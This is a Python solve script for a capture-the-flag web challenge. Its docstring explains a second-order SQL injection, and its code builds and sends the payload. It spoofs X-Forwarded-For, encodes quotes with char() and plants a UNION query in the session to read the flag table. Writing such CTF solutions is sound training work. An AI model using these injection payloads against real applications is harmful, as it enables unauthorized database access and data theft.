#!/usr/bin/env python3
"""
ip-blocked-secret — AlpacaHack Daily 2026-07-05  (second-order SQLi)

/set builds:  INSERT INTO secrets (ip, secret) VALUES ('{ip}', '{secret}')
              ON CONFLICT(ip) DO UPDATE SET secret = excluded.secret RETURNING id
- `ip` is only regex-checked (\\d{,3}.\\d{,3}.\\d{,3}.\\d{,3}) → <=3 free chars, but
  a trailing `'` pairs with the secret field's OPENING quote, so everything in
  `secret` becomes raw SQL. `secret` only doubles literal `'`, so we encode any
  quotes with char(). Terminate with `/*` (the template is multi-line, so `--`
  would leave later lines intact and re-break the query).
- We make RETURNING return a STRING via `char(...) AS id`. That string lands in
  the signed Flask session `sid`. The index runs `... WHERE id='{sid}'` with no
  length limit on sid → a second-order UNION. Reading requires the GET header ip
  to equal the row's ip, so the UNION supplies ip '1.3.3.7' and we send that.

Usage: python3 solve.py <base_url>
"""
import sys, re, urllib.parse, http.client

base = sys.argv[1].rstrip("/")
m = re.match(r"https?://([^:/]+):?(\d+)?", base)
HOST, PORT = m.group(1), int(m.group(2) or 80)

# Stage-2 string that RETURNING must yield into session.sid:
sid_payload = "' UNION SELECT flag, '1.3.3.7' FROM flag--"
char_codes = ",".join(str(ord(c)) for c in sid_payload)
secret = (f"||0,0)ON CONFLICT(ip)DO UPDATE SET secret=excluded.secret "
          f"RETURNING char({char_codes})AS id/*")

def post_set(ip, secret):
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    body = urllib.parse.urlencode({"secret": secret})
    c.request("POST", "/set", body,
              {"X-Forwarded-For": ip, "Content-Type": "application/x-www-form-urlencoded"})
    r = c.getresponse(); r.read()
    cookie = r.getheader("Set-Cookie")
    c.close()
    return re.search(r"session=[^;]+", cookie).group(0) if cookie else None

def get_index(ip, cookie):
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    c.request("GET", "/", None, {"X-Forwarded-For": ip, "Cookie": cookie})
    r = c.getresponse(); txt = r.read().decode(errors="replace")
    c.close()
    return txt

cookie = post_set("1.1.1'", secret)          # stage 1: sid = UNION string
assert cookie, "no session cookie"
body = get_index("1.3.3.7", cookie)           # stage 2: UNION reads flag under spoofed ip
mm = re.search(r"Alpaca\{[^}]*\}", body)
print(mm.group(0) if mm else body)
